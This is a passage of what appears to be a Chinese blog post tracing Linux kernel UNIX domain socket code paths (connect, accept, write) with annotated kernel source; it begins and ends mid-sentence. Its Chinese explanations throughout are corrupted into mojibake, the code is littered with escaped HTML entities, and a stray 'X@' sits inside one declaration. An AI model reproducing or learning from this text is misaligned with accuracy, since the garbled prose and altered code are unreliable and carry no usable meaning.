æ“ä½œå‡½æ•°ï¼Œæ‰§è¡Œå®é™…çš„è¿æ¥æ“ä½œã€‚ err = READ_ONCE(sock-\u0026gt;ops)-\u0026gt;connect(sock, (struct sockaddr *)address, addrlen, sock-\u0026gt;file-\u0026gt;f_flags | file_flags); out: return err; } **æ³¨æ„ï¼š**è¿™é‡Œ(sock-\u0026gt;ops)-\u0026gt;connect()ä¼šæ ¹æ®å¥—æ¥å­—çš„ç±»å‹è°ƒç”¨ä¸åŒçš„å®ç°å‡½æ•°ï¼Œä¾‹å¦‚SOCK_STREAMä¼šè°ƒç”¨unix_stream_connect()ï¼ŒSOCK_DGRAMï¼šä¼šè°ƒç”¨unix_dgram_connect()ã€‚\nåœ¨ UNIX domain socket ä¸­ï¼Œå¥—æ¥å­—çš„ç±»å‹å–å†³äºåœ¨è°ƒç”¨ socket() å‡½æ•°æ—¶æ‰€æŒ‡å®šçš„ç±»å‹å‚æ•°ã€‚ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ç±»å‹ï¼š\nSOCK_STREAM (æµå¼å¥—æ¥å­—)ï¼š åœ¨ä½ æä¾›çš„ä»£ç ä¸­ï¼Œä½¿ç”¨äº† SOCK_STREAMï¼Œè¿™æ„å‘³ç€å¥—æ¥å­—æ˜¯æµå¼çš„ï¼Œç±»ä¼¼äº TCP åè®®çš„å¥—æ¥å­—ã€‚ ç‰¹æ€§ï¼šé¢å‘è¿æ¥ï¼Œæä¾›å¯é çš„ã€æŒ‰é¡ºåºçš„ã€æ— æ•°æ®ä¸¢å¤±çš„é€šä¿¡ï¼Œé€‚ç”¨äºéœ€è¦å¯é ä¼ è¾“çš„åœºæ™¯ã€‚ æˆ‘çš„ server.c å’Œ client.c æ–‡ä»¶ä¸­éƒ½ä½¿ç”¨äº† AF_UNIX å’Œ SOCK_STREAMï¼Œå› æ­¤è¿™ä¸¤ä¸ªå¥—æ¥å­—æ˜¯å¯é çš„é¢å‘è¿æ¥çš„æµå¼å¥—æ¥å­—ã€‚ SOCK_DGRAM (æ•°æ®æŠ¥å¥—æ¥å­—)ï¼š è¿™æ˜¯å¦ä¸€ç§ç±»å‹çš„ UNIX domain socketï¼Œç±»ä¼¼äº UDP åè®®çš„å¥—æ¥å­—ã€‚ ç‰¹æ€§ï¼šé¢å‘æ— è¿æ¥ï¼Œä¼ è¾“ä¸ä¿è¯é¡ºåºæˆ–å¯é æ€§ï¼Œé€‚ç”¨äºå¯¹å¯é æ€§è¦æ±‚è¾ƒä½ä½†é€Ÿåº¦è¾ƒå¿«çš„åœºæ™¯ã€‚ ä½¿ç”¨ SOCK_DGRAM å¯ä»¥åœ¨ UNIX domain ä¸­å®ç°æ— è¿æ¥çš„æ•°æ®æŠ¥é€šä¿¡ã€‚ SOCK_SEQPACKET (æœ‰åºåˆ†ç»„å¥—æ¥å­—)ï¼š è¿™æ˜¯ UNIX domain socket ä¸­çš„ä¸€ç§è¾ƒå°‘ä½¿ç”¨çš„ç±»å‹ã€‚ ç‰¹æ€§ï¼šé¢å‘è¿æ¥ï¼Œæä¾›å¯é çš„ã€æœ‰åºçš„æ•°æ®ä¼ è¾“ï¼Œä½†ä¸åƒ SOCK_STREAM é‚£æ ·æ˜¯ä¸€ä¸ªè¿ç»­çš„æ•°æ®æµï¼Œè€Œæ˜¯ä¸€ä¸ªæœ‰åºçš„æ•°æ®åŒ…åºåˆ—ã€‚ é€‚ç”¨äºéœ€è¦æœ‰åºä¼ è¾“æ•°æ®åŒ…çš„åº”ç”¨ã€‚ unix_stream_connect() å‡½æ•°å®ç°äº† UNIX domain socket çš„è¿æ¥é€»è¾‘ã€‚å®ƒå¤„ç†äº†å®¢æˆ·ç«¯å¥—æ¥å­—è¿æ¥åˆ°æœåŠ¡å™¨ç›‘å¬å¥—æ¥å­—çš„è¿‡ç¨‹ã€‚\nstatic int unix_stream_connect(struct socket *sock, struct sockaddr *uaddr, int addr_len, int flags) { // å°†ä¼ å…¥çš„é€šç”¨åœ°å€ç»“æ„è½¬æ¢ä¸º UNIX ä¸“ç”¨åœ°å€ç»“æ„ struct sockaddr_un *sunaddr = (struct sockaddr_un *)uaddr; struct sock *sk = sock-\u0026gt;sk, *newsk = NULL, *other = NULL; struct unix_sock *u = unix_sk(sk), *newu, *otheru; struct net *net = sock_net(sk); struct sk_buff *skb = NULL; long timeo;X@ int err; int st; // éªŒè¯ä¼ å…¥çš„åœ°å€æ˜¯å¦æœ‰æ•ˆ err = unix_validate_addr(sunaddr, addr_len); if (err) goto out; // å¦‚æœå¥—æ¥å­—éœ€è¦ä¼ é€’å‡­æ®ä½†å°šæœªç»‘å®šï¼Œåˆ™è¿›è¡Œè‡ªåŠ¨ç»‘å®š if ((test_bit(SOCK_PASSCRED, \u0026amp;sock-\u0026gt;flags) || test_bit(SOCK_PASSPIDFD, \u0026amp;sock-\u0026gt;flags)) \u0026amp;\u0026amp; !u-\u0026gt;addr) { err = unix_autobind(sk); if (err) goto out; } // è®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œå–å†³äºæ˜¯å¦ä¸ºéé˜»å¡æ¨¡å¼ timeo = sock_sndtimeo(sk, flags \u0026amp; O_NONBLOCK); // åˆ›å»ºä¸€ä¸ªæ–°çš„å¥—æ¥å­—ï¼Œç”¨äºä»£è¡¨å³å°†å»ºç«‹çš„è¿æ¥ newsk = unix_create1(net, NULL, 0, sock-\u0026gt;type); if (IS_ERR(newsk)) { err = PTR_ERR(newsk); newsk = NULL; goto out; } err = -ENOMEM; // ä¸ºæ–°çš„å¥—æ¥å­—åˆ†é…sk_buff skb = sock_wmalloc(newsk, 1, 0, GFP_KERNEL); if (skb == NULL) goto out; restart: // æŸ¥æ‰¾ç›‘å¬å¥—æ¥å­— other = unix_find_other(net, sunaddr, addr_len, sk-\u0026gt;sk_type); if (IS_ERR(other)) { err = PTR_ERR(other); other = NULL; goto out; } // é”å®šç›®æ ‡å¥—æ¥å­—çš„çŠ¶æ€ unix_state_lock(other); // å¦‚æœç›®æ ‡å¥—æ¥å­—å·²æ­»äº¡ï¼Œè§£é”å¹¶é‡æ–°æŸ¥æ‰¾ if (sock_flag(other, SOCK_DEAD)) { unix_state_unlock(other); sock_put(other); goto restart; } // æ£€æŸ¥ç›®æ ‡å¥—æ¥å­—æ˜¯å¦åœ¨ç›‘å¬çŠ¶æ€ï¼Œæˆ–å·²å…³é—­æ¥æ”¶ err = -ECONNREFUSED; if (other-\u0026gt;sk_state != TCP_LISTEN) goto out_unlock; if (other-\u0026gt;sk_shutdown \u0026amp; RCV_SHUTDOWN) goto out_unlock; // å¦‚æœç›®æ ‡ç›‘å¬å¥—æ¥å­—çš„æ¥æ”¶é˜Ÿåˆ—å·²æ»¡ï¼Œåˆ™ç­‰å¾…ç›´åˆ°æœ‰ç©ºé—´æˆ–è¶…æ—¶ if (unix_recvq_full(other)) { err = -EAGAIN; if (!timeo) goto out_unlock; timeo = unix_wait_for_peer(other, timeo); err = sock_intr_errno(timeo); if (signal_pending(current)) goto out; sock_put(other); goto restart; } // é”å®šå‘èµ·è¿æ¥çš„å¥—æ¥å­—çŠ¶æ€ st = sk-\u0026gt;sk_state; switch (st) { case TCP_CLOSE: // å¥—æ¥å­—å¤„äºå…³é—­çŠ¶æ€ï¼Œå¯ä»¥ç»§ç»­è¿æ¥ break; case TCP_ESTABLISHED: // å¥—æ¥å­—å·²ç»è¿æ¥ err = -EISCONN; goto out_unlock; default: err = -EINVAL; goto out_unlock; } unix_state_lock_nested(sk); // åœ¨é”å®šçŠ¶æ€ä¸‹é‡æ–°æ£€æŸ¥å¥—æ¥å­—çŠ¶æ€ï¼Œç¡®ä¿æ²¡æœ‰å˜åŒ– if (sk-\u0026gt;sk_state != st) { unix_state_unlock(sk); unix_state_unlock(other); sock_put(other); goto restart; } // è¿›è¡Œå®‰å…¨æ€§æ£€æŸ¥ err = security_unix_stream_connect(sk, other, newsk); if (err) { unix_state_unlock(sk); goto out_unlock; } // è®¾ç½®æ–°å¥—æ¥å­—ä»¥å®Œæˆè¿æ¥ sock_hold(sk); unix_peer(newsk) = sk; newsk-\u0026gt;sk_state = TCP_ESTABLISHED; newsk-\u0026gt;sk_type = sk-\u0026gt;sk_type; init_peercred(newsk); newu = unix_sk(newsk); RCU_INIT_POINTER(newsk-\u0026gt;sk_wq, \u0026amp;newu-\u0026gt;peer_wq); otheru = unix_sk(other); // ä»ç›‘å¬å¥—æ¥å­—å¤åˆ¶åœ°å€ä¿¡æ¯åˆ°æ–°å¥—æ¥å­— if (otheru-\u0026gt;path.dentry) { path_get(\u0026amp;otheru-\u0026gt;path); newu-\u0026gt;path = otheru-\u0026gt;path; } refcount_inc(\u0026amp;otheru-\u0026gt;addr-\u0026gt;refcnt); smp_store_release(\u0026amp;newu-\u0026gt;addr, otheru-\u0026gt;addr); // è®¾ç½®æ–°å¥—æ¥å­—çš„å‡­æ® copy_peercred(sk, other); // æ›´æ–°å®¢æˆ·ç«¯å¥—æ¥å­—å’Œæ–°å¥—æ¥å­—çš„çŠ¶æ€ä¸ºå·²è¿æ¥ sock-\u0026gt;state = SS_CONNECTED; sk-\u0026gt;sk_state = TCP_ESTABLISHED; sock_hold(newsk); smp_mb__after_atomic(); unix_peer(sk) = newsk; unix_state_unlock(sk); // å°†è¿æ¥ä¿¡æ¯å‘é€ç»™ç›‘å¬å¥—æ¥å­— spin_lock(\u0026amp;other-\u0026gt;sk_receive_queue.lock); __skb_queue_tail(\u0026amp;other-\u0026gt;sk_receive_queue, skb); spin_unlock(\u0026amp;other-\u0026gt;sk_receive_queue.lock); unix_state_unlock(other); other-\u0026gt;sk_data_ready(other); sock_put(other); return 0; out_unlock: if (other) unix_state_unlock(other); out: kfree_skb(skb); if (newsk) unix_release_sock(newsk, 0); if (other) sock_put(other); return err; } unix_find_other()ï¼šæŸ¥æ‰¾å¯¹æ–¹æ­£åœ¨ç›‘å¬çš„å¥—æ¥å­—\nstatic struct sock *unix_find_other(struct net *net, struct sockaddr_un *sunaddr, int addr_len, int type) { struct sock *sk; if (sunaddr-\u0026gt;sun_path[0]) sk = unix_find_bsd(sunaddr, addr_len, type); else sk = unix_find_abstract(net, sunaddr, addr_len, type); return sk; } è¿™é‡Œæœ‰ä¸¤ä¸ªæŸ¥æ‰¾å‡½æ•°ï¼Œæˆ‘ä»¬é€‰æ‹©bsdé£æ ¼åˆ†æã€‚\nunix_find_bsd() å‡½æ•°ç”¨äºåœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æŸ¥æ‰¾ä¸ BSD é£æ ¼åœ°å€ç»‘å®šçš„ UNIX domain socketã€‚å®ƒé€šè¿‡ç»™å®šçš„è·¯å¾„åæ‰¾åˆ°å¯¹åº”çš„æ–‡ä»¶ï¼ˆå¥—æ¥å­—ï¼‰ï¼Œå¹¶è¿”å›ä¸ä¹‹å…³è”çš„ sock ç»“æ„ä½“ã€‚ä»¥ä¸‹æ˜¯å¯¹è¯¥å‡½æ•°çš„é€æ­¥åˆ†æå’Œä¸­æ–‡æ³¨é‡Šã€‚\nstatic struct sock *unix_find_bsd(struct sockaddr_un *sunaddr, int addr_len, int type) { struct inode *inode; struct path path; struct sock *sk; int err; // æ„å»º BSD é£æ ¼åœ°å€ï¼Œç¡®ä¿ sun_path åˆæ³• unix_mkname_bsd(sunaddr, addr_len); // ä½¿ç”¨ kern_path æŸ¥æ‰¾ç»™å®šè·¯å¾„å¯¹åº”çš„æ–‡ä»¶å¯¹è±¡ err = kern_path(sunaddr-\u0026gt;sun_path, LOOKUP_FOLLOW, \u0026amp;path); if (err) goto fail; // æ£€æŸ¥å¯¹è·¯å¾„çš„å†™æƒé™ï¼Œä»¥ç¡®ä¿èƒ½å¤Ÿç»‘å®š err = path_permission(\u0026amp;path, MAY_WRITE); if (err) goto path_put; // æ£€æŸ¥è¯¥è·¯å¾„å¯¹åº”çš„ inode æ˜¯å¦ä¸ºå¥—æ¥å­—ç±»å‹ err = -ECONNREFUSED; inode = d_backing_inode(path.dentry); if (!S_ISSOCK(inode-\u0026gt;i_mode)) goto path_put; // æŸ¥æ‰¾ inode å¯¹åº”çš„å¥—æ¥å­—å¯¹è±¡ sk = unix_find_socket_byinode(inode); if (!sk) goto path_put; // ç¡®ä¿å¥—æ¥å­—ç±»å‹ä¸€è‡´ err = -EPROTOTYPE; if (sk-\u0026gt;sk_type == type) touch_atime(\u0026amp;path); // æ›´æ–°è®¿é—®æ—¶é—´ else goto sock_put; // é‡Šæ”¾è·¯å¾„èµ„æº path_put(\u0026amp;path); return sk; sock_put: // é‡Šæ”¾å¥—æ¥å­—å¼•ç”¨ sock_put(sk); path_put: // é‡Šæ”¾è·¯å¾„å¼•ç”¨ path_put(\u0026amp;path); fail: // è¿”å›é”™è¯¯æŒ‡é’ˆ return ERR_PTR(err); } accept() ä»ç›‘å¬å¥—æ¥å­—ä¸­æ¥å—ä¸€ä¸ªæ–°è¿æ¥ï¼Œå¹¶å°†æ–°è¿æ¥çš„å¥—æ¥å­—ä¿¡æ¯å¤åˆ¶åˆ°ä¼ å…¥çš„ä¸€ä¸ªæ–°çš„å¥—æ¥å­—\n// syscall SYSCALL_DEFINE3(accept, int, fd, struct sockaddr __user *, upeer_sockaddr, int __user *, upeer_addrlen) { return __sys_accept4(fd, upeer_sockaddr, upeer_addrlen, 0); } accept()-\u0026gt;__sys_accept4()\nint __sys_accept4(int fd, struct sockaddr __user *upeer_sockaddr, int __user *upeer_addrlen, int flags) { int ret = -EBADF; struct fd f; f = fdget(fd); if (f.file) { ret = __sys_accept4_file(f.file, upeer_sockaddr, upeer_addrlen, flags); fdput(f); } return ret; } __sys_accept4()-\u0026gt;__sys_accept4_file()\n__sys_accept4_file() å‡½æ•°å®ç°äº†å¯¹å·²å­˜åœ¨å¥—æ¥å­—æ–‡ä»¶çš„ accept æ“ä½œï¼Œè¯¥å‡½æ•°ç”¨äºä»æ–‡ä»¶æè¿°ç¬¦ä¸­è·å–æ–°è¿æ¥ã€‚å®ƒå…è®¸å¯¹æ–°çš„å¥—æ¥å­—è®¾ç½®ä¸€äº›æ ‡å¿—ï¼Œæ¯”å¦‚éé˜»å¡å’Œå…³é—­æ–‡ä»¶æè¿°ç¬¦æ—¶è‡ªåŠ¨æ‰§è¡Œ closeã€‚\nstatic int __sys_accept4_file(struct file *file, struct sockaddr __user *upeer_sockaddr, int __user *upeer_addrlen, int flags) { struct file *newfile; int newfd; // æ£€æŸ¥ flagsï¼Œç¡®ä¿å®ƒä»¬æ˜¯åˆæ³•çš„ï¼Œä¸èƒ½æœ‰é™¤ SOCK_CLOEXEC å’Œ SOCK_NONBLOCK ä¹‹å¤–çš„å…¶ä»–æ ‡å¿— if (flags \u0026amp; ~(SOCK_CLOEXEC | SOCK_NONBLOCK)) return -EINVAL; // å¦‚æœ SOCK_NONBLOCK ä¸ O_NONBLOCK ä¸ç›¸ç­‰ä¸”è®¾ç½®äº† SOCK_NONBLOCKï¼Œåˆ™è½¬æ¢ä¸º O_NONBLOCK if (SOCK_NONBLOCK != O_NONBLOCK \u0026amp;\u0026amp; (flags \u0026amp; SOCK_NONBLOCK)) flags = (flags \u0026amp; ~SOCK_NONBLOCK) | O_NONBLOCK; // è·å–ä¸€ä¸ªæ–°çš„æ–‡ä»¶æè¿°ç¬¦ newfd = get_unused_fd_flags(flags); if (unlikely(newfd \u0026lt; 0)) return newfd; // ä½¿ç”¨ do_accept å‡½æ•°æ¥å—è¿æ¥ï¼Œè¿”å›æ–°çš„æ–‡ä»¶å¯¹è±¡ newfile = do_accept(file, 0, upeer_sockaddr, upeer_addrlen, flags); if (IS_ERR(newfile)) { // å¦‚æœå‡ºé”™ï¼Œåˆ™é‡Šæ”¾ä¹‹å‰è·å–çš„æ–‡ä»¶æè¿°ç¬¦ put_unused_fd(newfd); return PTR_ERR(newfile); } // å°†æ–°çš„æ–‡ä»¶å¯¹è±¡å®‰è£…åˆ°æ–°è·å–çš„æ–‡ä»¶æè¿°ç¬¦ä¸Š fd_install(newfd, newfile); return newfd; } __sys_accept4_file()-\u0026gt;do_accept()\ndo_accept() å‡½æ•°ç”¨äºæ¥å—ä¼ å…¥çš„è¿æ¥è¯·æ±‚ï¼Œä¸ºæ–°çš„è¿æ¥åˆ›å»ºå¥—æ¥å­—ï¼Œå¹¶è¿”å›ä¸€ä¸ªä¸æ–°è¿æ¥å…³è”çš„æ–‡ä»¶å¯¹è±¡ã€‚è¯¥å‡½æ•°æ˜¯å¤„ç† accept ç³»ç»Ÿè°ƒç”¨çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œä¸»è¦è´Ÿè´£èµ„æºçš„åˆ†é…å’Œè¿æ¥çš„å»ºç«‹ã€‚\nstruct file *do_accept(struct file *file, unsigned file_flags, struct sockaddr __user *upeer_sockaddr, int __user *upeer_addrlen, int flags) { struct socket *sock, *newsock; struct file *newfile; int err, len; struct sockaddr_storage address; const struct proto_ops *ops; // ä»æ–‡ä»¶å¯¹è±¡è·å–å¥—æ¥å­— sock = sock_from_file(file); if (!sock) return ERR_PTR(-ENOTSOCK); // ä¸ºæ–°çš„è¿æ¥åˆ†é…å¥—æ¥å­— newsock = sock_alloc(); if (!newsock) return ERR_PTR(-ENFILE); // è·å–åŸå§‹å¥—æ¥å­—çš„æ“ä½œæŒ‡é’ˆ ops = READ_ONCE(sock-\u0026gt;ops); // è®¾ç½®æ–°å¥—æ¥å­—çš„ç±»å‹å’Œæ“ä½œæŒ‡é’ˆ newsock-\u0026gt;type = sock-\u0026gt;type; newsock-\u0026gt;ops = ops; /* * æˆ‘ä»¬ä¸éœ€è¦è°ƒç”¨ try_module_getï¼Œå› ä¸ºç›‘å¬å¥—æ¥å­— (sock) å·²ç»æŒæœ‰äº† * åè®®æ¨¡å— (sock-\u0026gt;ops-\u0026gt;owner)ã€‚ */ __module_get(ops-\u0026gt;owner); // ä¸ºæ–°å¥—æ¥å­—åˆ†é…æ–‡ä»¶å¯¹è±¡ï¼Œå¹¶ä½¿ç”¨ç»™å®šçš„æ ‡å¿— newfile = sock_alloc_file(newsock, flags, sock-\u0026gt;sk-\u0026gt;sk_prot_creator-\u0026gt;name); if (IS_ERR(newfile)) return newfile; // è¿›è¡Œå®‰å…¨æ£€æŸ¥ï¼Œç¡®ä¿å¯ä»¥æ¥å—è¿æ¥ err = security_socket_accept(sock, newsock); if (err) goto out_fd; // è°ƒç”¨å¥—æ¥å­—çš„ accept æ“ä½œä»¥å»ºç«‹æ–°è¿æ¥ err = ops-\u0026gt;accept(sock, newsock, sock-\u0026gt;file-\u0026gt;f_flags | file_flags, false); if (err \u0026lt; 0) goto out_fd; // å¦‚æœéœ€è¦ï¼Œè·å–å¯¹ç­‰ç«¯çš„åœ°å€ä¿¡æ¯ if (upeer_sockaddr) { len = ops-\u0026gt;getname(newsock, (struct sockaddr *)\u0026amp;address, 2); if (len \u0026lt; 0) { err = -ECONNABORTED; goto out_fd; } err = move_addr_to_user(\u0026amp;address, len, upeer_sockaddr, upeer_addrlen); if (err \u0026lt; 0) goto out_fd; } /* æ–‡ä»¶æ ‡å¿—ä¸ä¼šé€šè¿‡ accept() ç»§æ‰¿ï¼Œè¿™ä¸å…¶ä»–æ“ä½œç³»ç»Ÿä¸åŒã€‚ */ return newfile; out_fd: // é‡Šæ”¾æ–°æ–‡ä»¶å¯¹è±¡çš„å¼•ç”¨ï¼Œé‡Šæ”¾èµ„æº fput(newfile); return ERR_PTR(err); } do_accept()-\u0026gt;unix_accept()\nunix_accept() å‡½æ•°ç”¨äºå®ç° UNIX domain socket çš„ accept æ“ä½œï¼Œå®ƒä»ç›‘å¬å¥—æ¥å­—ä¸­æ¥å—ä¸€ä¸ªæ–°è¿æ¥ï¼Œå¹¶å°†æ–°è¿æ¥çš„å¥—æ¥å­—ä¿¡æ¯å¤åˆ¶åˆ°ä¼ å…¥çš„ newsock ä¸­ã€‚\nstatic int unix_accept(struct socket *sock, struct socket *newsock, int flags, bool kern) { struct sock *sk = sock-\u0026gt;sk; struct sock *tsk; struct sk_buff *skb; int err; // å¦‚æœå¥—æ¥å­—ç±»å‹ä¸æ˜¯ SOCK_STREAM æˆ– SOCK_SEQPACKETï¼Œåˆ™è¿”å›ä¸æ”¯æŒçš„é”™è¯¯ err = -EOPNOTSUPP; if (sock-\u0026gt;type != SOCK_STREAM \u0026amp;\u0026amp; sock-\u0026gt;type != SOCK_SEQPACKET) goto out; // å¦‚æœå¥—æ¥å­—çŠ¶æ€ä¸æ˜¯ TCP_LISTENï¼Œåˆ™è¿”å›æ— æ•ˆå‚æ•°é”™è¯¯ err = -EINVAL; if (sk-\u0026gt;sk_state != TCP_LISTEN) goto out; /* å¦‚æœå¥—æ¥å­—çŠ¶æ€ä¸º TCP_LISTENï¼Œå®ƒåœ¨æ­¤å¤„ä¸ä¼šæ”¹å˜ï¼ˆæš‚æ—¶...ï¼‰ï¼Œå› æ­¤ä¸éœ€è¦åŠ é”ã€‚ */ // å°è¯•ä»ç›‘å¬å¥—æ¥å­—çš„æ¥æ”¶é˜Ÿåˆ—ä¸­è·å–æ•°æ®åŒ… skb = skb_recv_datagram(sk, (flags \u0026amp; O_NONBLOCK) ? MSG_DONTWAIT : 0, \u0026amp;err); if (!skb) { // å¦‚æœæ¥æ”¶é˜Ÿåˆ—ä¸ºç©ºå¹¶ä¸”å‘ç”Ÿæ¥æ”¶å…³é—­ï¼Œè¿”å›é”™è¯¯ if (err == 0) err = -EINVAL; goto out; } // è·å–æ–°è¿æ¥çš„å¥—æ¥å­— tsk = skb-\u0026gt;sk; skb_free_datagram(sk, skb); // å”¤é†’ç­‰å¾…è¿æ¥çš„è¿›ç¨‹ wake_up_interruptible(\u0026amp;unix_sk(sk)-\u0026gt;peer_wait); // å°†æ–°è¿æ¥çš„å¥—æ¥å­—é™„åŠ åˆ°ä¼ å…¥çš„ newsock ä¸Š unix_state_lock(tsk); newsock-\u0026gt;state = SS_CONNECTED; unix_sock_inherit_flags(sock, newsock); sock_graft(tsk, newsock); unix_state_unlock(tsk); return 0; out: return err; } write() SYSCALL_DEFINE3(write, unsigned int, fd, const char __user *, buf, size_t, count) { return ksys_write(fd, buf, count); } write()-\u0026gt;ksys_write()\nksys_write() æ˜¯ Linux å†…æ ¸ä¸­å®ç°çš„ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨å¤„ç†å‡½æ•°ï¼Œç”¨äºå¤„ç†æ¥è‡ªç”¨æˆ·æ€çš„ write() ç³»ç»Ÿè°ƒç”¨ã€‚åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œå®ƒæ¥æ”¶äº†ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ fdã€ä¸€ä¸ªç”¨æˆ·ç©ºé—´çš„ç¼“å†²åŒº buf ä»¥åŠå†™å…¥çš„å­—èŠ‚æ•° countï¼Œå¹¶é€šè¿‡ç›¸åº”çš„æ–‡ä»¶ç³»ç»Ÿæ¥å£å°†æ•°æ®å†™å…¥ç›®æ ‡æ–‡ä»¶æˆ–è®¾å¤‡ã€‚\nssize_t ksys_write(unsigned int fd, const char __user *buf, size_t count) { struct fd f = fdget_pos(fd); ssize_t ret = -EBADF; // ç¡®ä¿æ–‡ä»¶æè¿°ç¬¦æœ‰æ•ˆ if (f.file) { // file_ppos(f.file)ï¼šè¯¥å‡½æ•°ç”¨äºè·å–æ–‡ä»¶çš„å½“å‰åç§»é‡æŒ‡é’ˆã€‚å¯¹äºæŸäº›æ–‡ä»¶ç±»å‹ï¼ˆå¦‚å¸¸è§„æ–‡ä»¶ï¼‰ï¼Œåç§»é‡éœ€è¦ä¸æ–­æ›´æ–°ï¼Œè€Œå¯¹äºæŸäº›ç‰¹æ®Šæ–‡ä»¶ï¼ˆå¦‚ socketï¼‰ï¼Œå¯èƒ½ä¸éœ€è¦åç§»é‡ã€‚ loff_t pos, *ppos = file_ppos(f.file); // å¦‚æœæ–‡ä»¶æŒ‡é’ˆå­˜åœ¨ï¼Œè®¾ç½®å†™å…¥çš„èµ·å§‹ä½ç½® if (ppos) { pos = *ppos; ppos = \u0026amp;pos; } // è°ƒç”¨ vfs_write è¿›è¡Œå®é™…çš„å†™å…¥æ“ä½œï¼Œå…·ä½“çš„å†™å…¥æ“ä½œå°†ç”±ä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿæˆ–è®¾å¤‡é©±åŠ¨æ¥å®ç°ï¼Œä¾‹å¦‚å­—ç¬¦è®¾å¤‡ã€å—è®¾å¤‡ã€ç½‘ç»œå¥—æ¥å­—ç­‰ã€‚ ret = vfs_write(f.file, buf, count, ppos); // æ›´æ–°æ–‡ä»¶çš„åç§»é‡ if (ret \u0026gt;= 0 \u0026amp;\u0026amp; ppos) f.file-\u0026gt;f_pos = pos; // é‡Šæ”¾æ–‡ä»¶æè¿°ç¬¦å¼•ç”¨ fdput_pos(f); } return ret; } ksys_write()-\u0026gt;vfs_write()\nvfs_write() æ˜¯ Linux å†…æ ¸ä¸­ç”¨äºå¤„ç†æ–‡ä»¶å†™å…¥æ“ä½œçš„è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼ˆVFSï¼‰æ¥å£å‡½æ•°ã€‚å®ƒæ¥æ”¶ä¸€ä¸ª struct file æŒ‡é’ˆã€ç”¨æˆ·ç©ºé—´ç¼“å†²åŒºã€è¦å†™å…¥çš„å­—èŠ‚æ•°ä»¥åŠæ–‡ä»¶çš„åç§»é‡æŒ‡é’ˆï¼Œè´Ÿè´£æ‰§è¡Œå®é™…çš„æ•°æ®å†™å…¥æ“ä½œã€‚\nssize_t vfs_write(struct file *file, const char __user *buf, size_t count, loff_t *pos) { ssize_t ret; // æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å…·æœ‰å†™æƒé™ if (!(file-\u0026gt;f_mode \u0026amp; FMODE_WRITE)) return -EBADF; // æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å¯ä»¥å†™ if (!(file-\u0026gt;f_mode \u0026amp; FMODE_CAN_WRITE)) return -EINVAL; // æ£€æŸ¥ç”¨æˆ·ç©ºé—´ç¼“å†²åŒºæ˜¯å¦å¯è®¿é—® if (unlikely(!access_ok(buf, count))) return -EFAULT; // éªŒè¯å†™å…¥åŒºåŸŸæ˜¯å¦åˆæ³• ret = rw_verify_area(WRITE, file, pos, count); if (ret) return ret; // é™åˆ¶å†™å…¥å­—èŠ‚æ•°ï¼Œé¿å…è¿‡å¤§çš„å†™å…¥ if (count \u0026gt; MAX_RW_COUNT) count = MAX_RW_COUNT; // file_start_write()ï¼šç”¨äºæ–‡ä»¶ç³»ç»Ÿçš„å¹¶å‘æ§åˆ¶ï¼Œå¼€å§‹å†™æ“ä½œã€‚æŸäº›æ–‡ä»¶ç³»ç»Ÿéœ€è¦è¿™ç§æœºåˆ¶æ¥ç¡®ä¿æ•°æ®ä¸€è‡´æ€§ã€‚ file_start_write(file); // è°ƒç”¨å…·ä½“çš„å†™å…¥å‡½æ•° if (file-\u0026gt;f_op-\u0026gt;write) ret = file-\u0026gt;f_op-\u0026gt;write(file, buf, count, pos); // æ—§ç‰ˆå†™å…¥æ¥å£ else if (file-\u0026gt;f_op-\u0026gt;write_iter) ret = new_sync_write(file, buf, count, pos); // æ–°ç‰ˆå†™å…¥æ¥å£ else ret = -EINVAL; // å¦‚æœå†™å…¥æˆåŠŸï¼Œè¿›è¡Œé€šçŸ¥å’Œæ›´æ–°ç»Ÿè®¡ if (ret \u0026gt; 0) { fsnotify_modify(file); add_wchar(current, ret); } // æ›´æ–°å†™å…¥ç³»ç»Ÿè°ƒç”¨è®¡æ•° inc_syscw(current); // ç»“æŸå†™æ“ä½œ file_end_write(file); return ret; } vfs_write()-\u0026gt;sock_write_iter()\nsock_write_iter() æ˜¯ç”¨äºå®ç°å¥—æ¥å­—æ–‡ä»¶å†™å…¥çš„å‡½æ•°ï¼Œæ”¯æŒé€šè¿‡è¿­ä»£æ¥å£ (write_iter)æ¥å®Œæˆå†™å…¥æ“ä½œã€‚è¯¥å‡½æ•°ä»ç”¨æˆ·ç©ºé—´è·å–æ•°æ®å¹¶å†™å…¥åˆ°ä¸ä¹‹å…³è”çš„å¥—æ¥å­—ä¸­ã€‚\nstatic ssize_t sock_write_iter(struct kiocb *iocb, struct iov_iter *from) { struct file *file = iocb-\u0026gt;ki_filp; struct socket *sock = file-\u0026gt;private_data; struct msghdr msg = {.msg_iter = *from, .msg_iocb = iocb}; ssize_t res; // å¦‚æœæ–‡ä»¶åç§»é‡ä¸ä¸º0ï¼Œåˆ™è¿”å›-ESPIPEé”™è¯¯ï¼Œå› ä¸ºå¥—æ¥å­—æ˜¯æµå¼æ–‡ä»¶ï¼Œä¸æ”¯æŒä½ç½®è°ƒæ•´ if (iocb-\u0026gt;ki_pos != 0) return -ESPIPE; // å¦‚æœæ–‡ä»¶æ˜¯éé˜»å¡æ¨¡å¼æˆ–è€…IOCBæ ‡å¿—è®¾ç½®äº†ä¸ç­‰å¾…ï¼Œåˆ™è®¾ç½®æ¶ˆæ¯æ ‡å¿—MSG_DONTWAIT if (file-\u0026gt;f_flags \u0026amp; O_NONBLOCK || (iocb-\u0026gt;ki_flags \u0026amp; IOCB_NOWAIT)) msg.msg_flags = MSG_DONTWAIT; // å¦‚æœå¥—æ¥å­—ç±»å‹æ˜¯é¡ºåºåŒ…ï¼ˆSOCK_SEQPACKETï¼‰ï¼Œè®¾ç½®æ¶ˆæ¯æ ‡å¿—MSG_EOR if (sock-\u0026gt;type == SOCK_SEQPACKET) msg.msg_flags |= MSG_EOR; // è°ƒç”¨å†…æ ¸å‡½æ•°å‘é€æ¶ˆæ¯ res = __sock_sendmsg(sock, \u0026amp;msg); // æ›´æ–°è¿­ä»£å™¨çŠ¶æ€ 